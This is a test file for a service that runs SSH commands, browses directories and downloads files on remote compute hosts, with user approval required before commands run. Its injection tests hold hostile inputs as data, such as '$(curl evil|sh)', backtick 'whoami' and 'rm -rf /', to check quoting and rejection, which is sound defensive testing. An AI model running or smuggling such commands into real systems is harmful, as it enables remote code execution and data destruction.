import { mkdtemp, readFile, readdir, rm, stat, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { basename, dirname, join } from 'node:path'

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import type { ComputeHost } from '../../shared/compute'
import type { DownloadDest } from '../../shared/remote-fs'
import type { ComputeApprovalBroker } from './compute-approval-broker'
import {
  ComputeConnectionError,
  type ComputeConnectionBrokerAcquirer,
  type ComputeConnectionLease
} from './connection-broker'
import { ComputeRemoteOperationOwner } from './compute-remote-operation-owner'
import type { ComputeHostRepository } from './repository'
import type { ResolvedSshTarget, SshRunner } from './ssh-runner'
import { runScpTransfer, runScpUpload, type ScpRunner } from './scp-runner'
import { SessionCacheOwner } from './session-cache-owner'
import { waitForDataRootWriters } from '../storage/migration-state'

const sampleHost = (overrides: Partial<ComputeHost> = {}): ComputeHost => ({
  id: 'host-1',
  providerId: 'ssh:biowulf',
  displayName: 'biowulf',
  shape: 'direct_ssh',
  sshAlias: 'biowulf',
  sshOverrides: undefined,
  scratchRoot: undefined,
  scratchPinned: false,
  concurrencyLimit: undefined,
  probeResult: undefined,
  detailsDoc: '',
  detailsUpdatedAt: undefined,
  detailsUpdatedBy: undefined,
  createdAt: 1,
  updatedAt: 1,
  ...overrides
})

const fakeTarget: ResolvedSshTarget = {
  sshBinary: '/usr/bin/ssh',
  host: 'biowulf.nih.gov',
  extraArgs: ['-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10']
}

const makeFakeRunner = (result: Awaited<ReturnType<SshRunner['run']>>): SshRunner => ({
  run: vi.fn(() => Promise.resolve(result))
})

const makeRepo = (host: ComputeHost | null = sampleHost()): { repo: ComputeHostRepository } => ({
  repo: {
    get: vi.fn(() => Promise.resolve(host)),
    list: vi.fn(() => Promise.resolve([])),
    create: vi.fn(),
    delete: vi.fn(),
    updateProbeResult: vi.fn(),
    updateScratchRoot: vi.fn(),
    updateDetails: vi.fn(),
    updateScratchPinned: vi.fn(),
    updateConcurrencyLimit: vi.fn()
  } as unknown as ComputeHostRepository
})

vi.mock('./ssh-runner', async (importOriginal) => {
  const original = await importOriginal<typeof import('./ssh-runner')>()
  return {
    ...original,
    resolveSshTarget: vi.fn(() => Promise.resolve(fakeTarget))
  }
})

const makeApprovalBroker = (decision: 'once' | 'deny'): ComputeApprovalBroker =>
  ({
    request: vi.fn(() => Promise.resolve(decision)),
    requestWithContext: vi.fn(() => Promise.resolve(decision)),
    respond: vi.fn()
  }) as unknown as ComputeApprovalBroker

const defaultScpRunner = (): ScpRunner => ({
  copy: vi.fn(() => Promise.resolve({ exitCode: 0, stderr: '', timedOut: false }))
})

const makeOwner = (
  runner: SshRunner,
  repository: ComputeHostRepository,
  approvalBroker?: ComputeApprovalBroker,
  scpRunner: ScpRunner = defaultScpRunner(),
  overrideDownloadsDir?: string
): ComputeRemoteOperationOwner =>
  new ComputeRemoteOperationOwner(
    {
      acquire: vi.fn(
        async () =>
          ({
            run: (command, options) => runner.run(fakeTarget, command, options),
            upload: (localPath, remotePath) =>
              runScpUpload(scpRunner, fakeTarget, localPath, remotePath),
            download: async (remotePath, localPath, maxBytes) => {
              await runScpTransfer(scpRunner, fakeTarget, remotePath, localPath)
              const size = (await stat(localPath)).size
              return {
                exitCode: 0,
                stderr: '',
                timedOut: false,
                bytesWritten: size,
                exceeded: size > maxBytes
              }
            }
          }) satisfies ComputeConnectionLease
      )
    } as ComputeConnectionBrokerAcquirer,
    repository,
    approvalBroker,
    overrideDownloadsDir,
    overrideDownloadsDir ? new SessionCacheOwner(overrideDownloadsDir) : undefined
  )

describe('ComputeRemoteOperationOwner.callCommand', () => {
  it('binds request cancellation to connection acquisition and SSH execution', async () => {
    const run = vi.fn(async () => ({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    }))
    const acquire = vi.fn(async () => ({
      run,
      upload: vi.fn(),
      download: vi.fn()
    }))
    const { repo } = makeRepo()
    const service = new ComputeRemoteOperationOwner({ acquire }, repo, makeApprovalBroker('once'))
    const signal = new AbortController().signal

    await service.callCommand(
      'ssh:biowulf',
      'echo hi',
      'intent',
      true,
      undefined,
      undefined,
      signal
    )

    expect(acquire).toHaveBeenCalledWith('ssh:biowulf', {
      intent: 'direct_command',
      signal
    })
    expect(run).toHaveBeenCalledWith(expect.any(String), expect.objectContaining({ signal }))
  })

  it('preserves a stable sanitized password-authentication error code', async () => {
    const runner: SshRunner = {
      run: vi.fn(async () => {
        throw new ComputeConnectionError('authentication_failed')
      })
    }
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, makeApprovalBroker('once'))

    const failure = await service
      .callCommand('ssh:biowulf', 'echo hi', 'intent')
      .catch((error) => error)

    expect(failure.computeCallError).toEqual({
      error_code: 'authentication_failed',
      message: 'Authentication failed. Verify the username and password.',
      retry_after_user_action: true
    })
  })

  it('returns ExecResult on success with correct fields', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'hello world',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const broker = makeApprovalBroker('once')
    const service = makeOwner(runner, repo, broker)

    const result = await service.callCommand('ssh:biowulf', 'echo hello', 'test intent')

    expect(result.exit_code).toBe(0)
    expect(result.stdout).toBe('hello world')
    expect(result.stderr).toBe('')
    expect(result.truncated).toBe(false)
  })

  it('calls runner with login shell when loginShell=true', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, makeApprovalBroker('once'))

    await service.callCommand('ssh:biowulf', 'echo hi', 'intent', true)

    expect(runMock).toHaveBeenCalledWith(
      expect.anything(),
      expect.stringContaining('echo hi'),
      expect.objectContaining({ loginShell: true })
    )
  })

  it('wraps command with scratchRoot cd when configured', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const host = sampleHost({ scratchRoot: '/scratch/user' })
    const { repo } = makeRepo(host)
    const service = makeOwner(runner, repo, makeApprovalBroker('once'))

    await service.callCommand('ssh:biowulf', 'ls', 'list files')

    const calledCmd = (runMock.mock.calls[0] as unknown as [unknown, string])?.[1]
    expect(calledCmd).toContain('/scratch/user')
    expect(calledCmd).toContain('ls')
  })

  it('quotes scratchRoot so shell expansions cannot add unapproved commands', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const host = sampleHost({ scratchRoot: '/scratch/$(touch /tmp/not-approved)' })
    const { repo } = makeRepo(host)
    const approvalBroker = makeApprovalBroker('once')
    const service = makeOwner(runner, repo, approvalBroker)

    await service.callCommand('ssh:biowulf', 'printf approved', 'test approval')

    expect(approvalBroker.request).toHaveBeenCalledWith(
      expect.objectContaining({ command_full: 'printf approved' }),
      undefined,
      undefined
    )
    const calledCmd = (runMock.mock.calls[0] as unknown as [unknown, string])?.[1]
    expect(calledCmd).toBe(
      "cd '/scratch/$(touch /tmp/not-approved)' 2>/dev/null || cd ~; printf approved"
    )
  })

  it('falls back to cd ~ when no scratchRoot is configured', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo(sampleHost({ scratchRoot: undefined }))
    const service = makeOwner(runner, repo, makeApprovalBroker('once'))

    await service.callCommand('ssh:biowulf', 'ls', 'list files')

    const calledCmd = (runMock.mock.calls[0] as unknown as [unknown, string])?.[1]
    expect(calledCmd).toContain('cd ~')
  })

  it('uses default 60s timeout when not specified', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, makeApprovalBroker('once'))

    await service.callCommand('ssh:biowulf', 'echo hi', 'intent')

    expect(runMock).toHaveBeenCalledWith(
      expect.anything(),
      expect.anything(),
      expect.objectContaining({ timeoutMs: 60_000 })
    )
  })

  it('uses caller-provided timeout when specified', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, makeApprovalBroker('once'))

    await service.callCommand('ssh:biowulf', 'echo hi', 'intent', true, 120)

    expect(runMock).toHaveBeenCalledWith(
      expect.anything(),
      expect.anything(),
      expect.objectContaining({ timeoutMs: 120_000 })
    )
  })

  it('throws approval_denied when user denies', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, makeApprovalBroker('deny'))

    const err = await service.callCommand('ssh:biowulf', 'rm -rf /', 'cleanup').catch((e) => e)

    expect(err).toBeInstanceOf(Error)
    expect(err.computeCallError?.error_code).toBe('approval_denied')
    expect(err.computeCallError?.retry_after_user_action).toBe(false)
  })

  it('throws host_unreachable on ssh exit 255', async () => {
    const runner = makeFakeRunner({
      exitCode: 255,
      stdout: '',
      stderr: 'ssh: connect to host biowulf port 22: Connection refused',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, makeApprovalBroker('once'))

    const err = await service.callCommand('ssh:biowulf', 'echo hi', 'intent').catch((e) => e)

    expect(err.computeCallError?.error_code).toBe('host_unreachable')
    expect(err.computeCallError?.retry_after_user_action).toBe(true)
  })

  it('throws timeout when the runner times out', async () => {
    const runner = makeFakeRunner({
      exitCode: null,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: true
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, makeApprovalBroker('once'))

    const err = await service.callCommand('ssh:biowulf', 'sleep 9999', 'long sleep').catch((e) => e)

    expect(err.computeCallError?.error_code).toBe('timeout')
    expect(err.computeCallError?.retry_after_user_action).toBe(false)
  })

  it('passes truncated=true when output is capped', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'large output',
      stderr: '',
      truncated: true,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, makeApprovalBroker('once'))

    const result = await service.callCommand('ssh:biowulf', 'cat big_file', 'read file')

    expect(result.truncated).toBe(true)
  })

  it('fires approval BEFORE any ssh run call', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const callOrder: string[] = []
    const broker: ComputeApprovalBroker = {
      request: vi.fn(() => {
        callOrder.push('approval')
        return Promise.resolve('once' as const)
      }),
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker
    // Override run to record call order AFTER approval mock records its order.
    ;(runMock as ReturnType<typeof vi.fn>).mockImplementation(() => {
      callOrder.push('ssh')
      return Promise.resolve({
        exitCode: 0,
        stdout: '',
        stderr: '',
        truncated: false,
        timedOut: false
      })
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, broker)

    await service.callCommand('ssh:biowulf', 'echo hi', 'intent')

    expect(callOrder).toEqual(['approval', 'ssh'])
  })

  it('throws when no approval broker is injected', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    // No broker injected
    const service = makeOwner(runner, repo)

    await expect(service.callCommand('ssh:biowulf', 'echo hi', 'intent')).rejects.toThrow(
      /approval.*broker|required/i
    )
  })
})

// ---------------------------------------------------------------------------
// ComputeRemoteOperationOwner.listDir — fake SshRunner
// ---------------------------------------------------------------------------

// Helper to build a single NUL-terminated find -printf record.
const findRecord = (type: string, size: number, mtime: number, name: string): string =>
  `${type}\t${size}\t${mtime}\t${name}\0`

// Build a mock stdout for listDir: realpath\nhome\nfind_output
const buildListDirStdout = (resolvedPath: string, home: string, findOutput: string): string =>
  `${resolvedPath}\n${home}\n${findOutput}`

describe('ComputeRemoteOperationOwner.listDir', () => {
  it('quotes a ~/ suffix so shell expansions cannot run while browsing', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({
        exitCode: 0,
        stdout: '/home/user/$(touch /tmp/not-approved)\n/home/user\n',
        stderr: '',
        truncated: false,
        timedOut: false
      })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    await service.listDir('ssh:biowulf', '~/$(touch /tmp/not-approved)')

    const calledCmd = (runMock.mock.calls[0] as unknown as [unknown, string])?.[1]
    expect(calledCmd).toContain("realpath ~/'$(touch /tmp/not-approved)'")
    expect(calledCmd).toContain("cd ~/'$(touch /tmp/not-approved)' || exit 1")
  })

  it('preserves a stable sanitized password-authentication error code', async () => {
    const runner: SshRunner = {
      run: vi.fn(async () => {
        throw new ComputeConnectionError('credential_unavailable')
      })
    }
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    const failure = await service.listDir('ssh:biowulf', '/work').catch((error) => error)

    expect(failure.remoteFsError).toMatchObject({
      authenticationCode: 'credential_unavailable',
      detail: 'The saved credential is unavailable on this device.',
      remoteKind: 'connection'
    })
  })

  it('resolves path, home, scratch from stdout and returns sorted entries', async () => {
    const findOut = [
      findRecord('f', 2048, 1704067200.0, 'zebra.txt'),
      findRecord('d', 0, 1704067200.0, 'beta'),
      findRecord('f', 512, 1704067200.0, 'alpha.txt'),
      findRecord('d', 0, 1704067200.0, 'alpha')
    ].join('')
    const stdout = buildListDirStdout('/resolved/path', '/home/user', findOut)

    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo(sampleHost({ scratchRoot: '/scratch/user' }))
    const service = makeOwner(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/some/path')

    expect(result.resolvedPath).toBe('/resolved/path')
    expect(result.roots.home).toBe('/home/user')
    expect(result.roots.scratch).toBe('/scratch/user')
    expect(result.truncated).toBe(false)
    expect(result.entries.map((e) => e.name)).toEqual(['alpha', 'beta', 'alpha.txt', 'zebra.txt'])
    expect(result.entries[0]?.isDirectory).toBe(true)
    expect(result.entries[2]?.isDirectory).toBe(false)
  })

  it('truncates at 5000 entries and sets truncated=true', async () => {
    const findOut = Array.from({ length: 5001 }, (_, i) =>
      findRecord('f', i, 1704067200.0, `file${String(i).padStart(5, '0')}.txt`)
    ).join('')
    const stdout = buildListDirStdout('/path', '/home/user', findOut)

    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.truncated).toBe(true)
    expect(result.entries).toHaveLength(5000)
  })

  it('sets truncated=false when exactly 5000 entries', async () => {
    const findOut = Array.from({ length: 5000 }, (_, i) =>
      findRecord('f', i, 1704067200.0, `file${i}.txt`)
    ).join('')
    const stdout = buildListDirStdout('/path', '/home/user', findOut)

    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.truncated).toBe(false)
    expect(result.entries).toHaveLength(5000)
  })

  it('returns empty entries for an empty directory', async () => {
    const stdout = buildListDirStdout('/path', '/home/user', '')

    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.entries).toEqual([])
    expect(result.truncated).toBe(false)
  })

  it('omits roots.scratch when host has no scratchRoot', async () => {
    const stdout = buildListDirStdout('/path', '/home/user', '')
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo(sampleHost({ scratchRoot: undefined }))
    const service = makeOwner(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.roots.scratch).toBeUndefined()
    expect(result.roots.home).toBe('/home/user')
  })

  it('passes maxOutputBytes ~2MB to the runner', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({
        exitCode: 0,
        stdout: buildListDirStdout('/path', '/home/user', ''),
        stderr: '',
        truncated: false,
        timedOut: false
      })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    await service.listDir('ssh:biowulf', '/path')

    const opts = (
      runMock.mock.calls[0] as unknown as [unknown, unknown, { maxOutputBytes?: number }]
    )?.[2]
    expect(opts?.maxOutputBytes).toBeGreaterThanOrEqual(1024 * 1024)
  })

  it('throws not_found when stderr says no such file', async () => {
    const runner = makeFakeRunner({
      exitCode: 1,
      stdout: '',
      stderr: 'realpath: /no/such/path: No such file or directory',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    const err = await service.listDir('ssh:biowulf', '/no/such/path').catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('not_found')
  })

  it('throws connection on ssh exit 255', async () => {
    const runner = makeFakeRunner({
      exitCode: 255,
      stdout: '',
      stderr: 'ssh: connect to host biowulf port 22: Connection refused',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    const err = await service.listDir('ssh:biowulf', '/path').catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('connection')
    expect(err.remoteFsError?.retry_after_user_action).toBe(true)
  })

  // Regression guard for the "silent fallback to $HOME" bug: the remote command must abort on a
  // failed `cd` (nonzero exit) rather than swallowing it with `|| true`, and must NOT fold cd's
  // stderr into stdout (`2>&1`) — stderr has to reach classifyRemoteError intact.
  it('builds a remote command that aborts on cd failure and preserves cd stderr', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({
        exitCode: 0,
        stdout: buildListDirStdout('/path', '/home/user', ''),
        stderr: '',
        truncated: false,
        timedOut: false
      })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    await service.listDir('ssh:biowulf', '/path')

    const remoteCmd = (runMock.mock.calls[0] as unknown as [unknown, string])?.[1]
    expect(remoteCmd).toContain('cd ')
    expect(remoteCmd).toContain('|| exit 1')
    // The bug lived here: `|| true` swallowed the failure and `2>&1` hid the reason.
    expect(remoteCmd).not.toContain('|| true')
    expect(remoteCmd).not.toContain('cd "/path" 2>&1')
  })

  // End-to-end of the fix: when `cd` into a nonexistent dir fails, the remote shell exits nonzero
  // with cd's stderr — this must throw (not_found), never silently list $HOME.
  it('throws not_found when cd into a nonexistent path fails', async () => {
    const runner = makeFakeRunner({
      exitCode: 1,
      // realpath echoed the raw path to stdout, then cd failed to stderr and `exit 1` aborted.
      stdout: '/no/such/path\n',
      stderr: 'bash: line 2: cd: /no/such/path: No such file or directory',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    const err = await service.listDir('ssh:biowulf', '/no/such/path').catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('not_found')
  })

  it('throws when the host does not exist', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '/p\n/h\n',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo(null)
    const service = makeOwner(runner, repo)

    await expect(service.listDir('ssh:nonexistent', '/path')).rejects.toThrow(
      /not found|no compute host/i
    )
  })

  it('converts float mtime to milliseconds', async () => {
    const findOut = findRecord('f', 1024, 1704067200.5, 'data.csv')
    const stdout = buildListDirStdout('/path', '/home/user', findOut)
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.entries[0]?.mtimeMs).toBe(1704067200500)
  })

  it('handles names with spaces', async () => {
    const findOut = findRecord('f', 100, 1704067200.0, 'my file with spaces.txt')
    const stdout = buildListDirStdout('/path', '/home/user', findOut)
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.entries[0]?.name).toBe('my file with spaces.txt')
  })

  it('single-quotes an injection path so the remote shell cannot expand it', async () => {
    // A malicious directory name double-clicked in the browser must not reach the shell unquoted.
    const runMock = vi.fn(() =>
      Promise.resolve({
        exitCode: 0,
        stdout: buildListDirStdout('/p', '/home/user', ''),
        stderr: '',
        truncated: false,
        timedOut: false
      })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo)

    await service.listDir('ssh:biowulf', '/data/$(curl evil|sh)')

    const remoteCmd = (runMock.mock.calls[0] as unknown as [unknown, string])[1]
    // The dangerous path appears only inside single quotes; there is no bare $( in the command
    // outside a single-quoted context. Assert the single-quoted literal is present verbatim.
    expect(remoteCmd).toContain(`'/data/$(curl evil|sh)'`)
  })
})

// ---------------------------------------------------------------------------
// ComputeRemoteOperationOwner.download — fake SshRunner + fake ScpRunner
// ---------------------------------------------------------------------------

// Fake ScpRunner: returns a configurable result.
const makeFakeScpRunner = (result: Awaited<ReturnType<ScpRunner['copy']>>): ScpRunner => ({
  copy: vi.fn(() => Promise.resolve(result))
})

// Success scpRunner.
const successScpRunner = makeFakeScpRunner({ exitCode: 0, stderr: '', timedOut: false })

describe('ComputeRemoteOperationOwner.download (os-downloads)', () => {
  let tmpDir: string

  beforeEach(async () => {
    tmpDir = await mkdtemp(join(tmpdir(), 'cs-download-test-'))
  })

  afterEach(async () => {
    await rm(tmpDir, { recursive: true, force: true })
  })

  it('downloads a file to os-downloads and returns LocalFile', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 1024',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    // Fake the scpRunner to create the dest file so stat succeeds after transfer.
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        // args last element is local dest path
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'x'.repeat(1024))
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = makeOwner(runner, repo, undefined, scpRunner, tmpDir)
    const dest: DownloadDest = { kind: 'os-downloads' }

    const result = await service.download('ssh:biowulf', '/remote/data.csv', dest)

    expect(result.name).toBe('data.csv')
    expect(result.size).toBe(1024)
    expect(result.path).toContain('data.csv')
    expect(result.mimeType).toBe('text/csv')
    const transferPath = vi.mocked(scpRunner.copy).mock.calls[0]?.[1].at(-1)
    expect(transferPath).toMatch(/data\.csv\..+\.partial$/)
    expect(result.path).not.toBe(transferPath)
    expect(await readdir(tmpDir)).toEqual(['data.csv'])
  })

  it('rejects a truncated OS download whose local size is smaller than the pre-transfer stat', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 10',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'short')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = makeOwner(runner, repo, undefined, scpRunner, tmpDir)

    const error = await service
      .download('ssh:biowulf', '/remote/data.csv', { kind: 'os-downloads' })
      .catch((cause) => cause)

    expect(error.remoteFsError).toMatchObject({
      remoteKind: 'not_a_file',
      detail: expect.stringMatching(/changed during transfer/i)
    })
    expect(await readdir(tmpDir)).toEqual([])
  })

  it('classifies a rejected post-transfer stat as a connection failure', async () => {
    const run = vi
      .fn<SshRunner['run']>()
      .mockResolvedValueOnce({
        exitCode: 0,
        stdout: 'f 10',
        stderr: '',
        truncated: false,
        timedOut: false
      })
      .mockRejectedValueOnce(new ComputeConnectionError('authentication_failed'))
    const runner: SshRunner = { run }
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'downloaded')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = makeOwner(runner, repo, undefined, scpRunner, tmpDir)

    const error = await service
      .download('ssh:biowulf', '/remote/data.csv', { kind: 'os-downloads' })
      .catch((cause) => cause)

    expect(run).toHaveBeenCalledTimes(2)
    expect(error.remoteFsError).toEqual({
      detail: 'Authentication failed. Verify the username and password.',
      remoteKind: 'connection',
      retry_after_user_action: true,
      authenticationCode: 'authentication_failed'
    })
    expect(await readdir(tmpDir)).toEqual([])
  })

  it('renames colliding file with (1) suffix', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 10',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    // Pre-create the collision file.
    await writeFile(join(tmpDir, 'data.csv'), 'existing')
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'downloaded')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = makeOwner(runner, repo, undefined, scpRunner, tmpDir)
    const result = await service.download('ssh:biowulf', '/remote/data.csv', {
      kind: 'os-downloads'
    })

    expect(result.name).toBe('data (1).csv')
  })

  it('keeps the final Downloads names untouched and cleans staging when transfer fails', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    await writeFile(join(tmpDir, 'data.csv'), 'existing')
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'truncated')
        return { exitCode: 255, stderr: 'Connection refused', timedOut: false }
      })
    }
    const service = makeOwner(runner, repo, undefined, scpRunner, tmpDir)

    await expect(
      service.download('ssh:biowulf', '/remote/data.csv', { kind: 'os-downloads' })
    ).rejects.toMatchObject({ remoteFsError: { remoteKind: 'connection' } })

    await expect(readFile(join(tmpDir, 'data.csv'), 'utf8')).resolves.toBe('existing')
    expect(await readdir(tmpDir)).toEqual(['data.csv'])
  })

  it('throws too_large when stat says >2GiB', async () => {
    const bigSize = 2 * 1024 * 1024 * 1024 + 1
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: `f ${bigSize}`,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async () => ({ exitCode: 0, stderr: '', timedOut: false }))
    }
    const service = makeOwner(runner, repo, undefined, scpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/big.bin', { kind: 'os-downloads' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('too_large')
  })

  it('throws connection error when scp fails with exit 255', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner = makeFakeScpRunner({
      exitCode: 255,
      stderr: 'Connection refused',
      timedOut: false
    })
    const service = makeOwner(runner, repo, undefined, scpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/data.csv', { kind: 'os-downloads' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('connection')
  })

  it('throws when host is not found', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo(null)
    const service = makeOwner(runner, repo, undefined, successScpRunner, tmpDir)

    await expect(
      service.download('ssh:nonexistent', '/remote/data.csv', { kind: 'os-downloads' })
    ).rejects.toThrow(/no compute host found/i)
  })

  it('rejects an injection path (outside_roots) before scp', async () => {
    const scpCopy = vi.fn(() => Promise.resolve({ exitCode: 0, stderr: '', timedOut: false }))
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, undefined, { copy: scpCopy }, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/`whoami`.csv', { kind: 'os-downloads' })
      .catch((e) => e)

    expect(err.remoteFsError?.remoteKind).toBe('outside_roots')
    expect(scpCopy).not.toHaveBeenCalled()
  })
})

describe('ComputeRemoteOperationOwner.download (artifact)', () => {
  let tmpDir: string

  beforeEach(async () => {
    tmpDir = await mkdtemp(join(tmpdir(), 'cs-artifact-test-'))
  })

  afterEach(async () => {
    await rm(tmpDir, { recursive: true, force: true })
  })

  it('imports a file as artifact and returns LocalFile with provenance', async () => {
    // stat command returns: is_file=1 size=4096
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 4096',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'x'.repeat(4096))
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = makeOwner(runner, repo, undefined, scpRunner, tmpDir)
    const dest: DownloadDest = { kind: 'artifact', projectId: 'proj-1' }

